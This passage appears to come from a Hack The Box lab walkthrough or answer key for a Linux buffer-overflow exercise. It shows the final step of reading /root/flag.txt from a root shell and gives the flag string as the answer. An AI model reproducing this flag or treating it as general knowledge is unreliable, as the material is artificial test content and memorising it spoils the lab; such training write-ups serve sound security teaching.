At last, students need to print out the flag file "flag.txt", which is under the `/root/` directory:

```shell
cat /root/flag.txt
```
```
root@nixbof32skills:/home/htb-student# cat /root/flag.txt
cat /root/flag.txt

HTB{wmcaJe4dEFZ3pbgDEpToJxFwvTEP4t}
```

Answer: `HTB{wmcaJe4dEFZ3pbgDEpToJxFwvTEP4t}`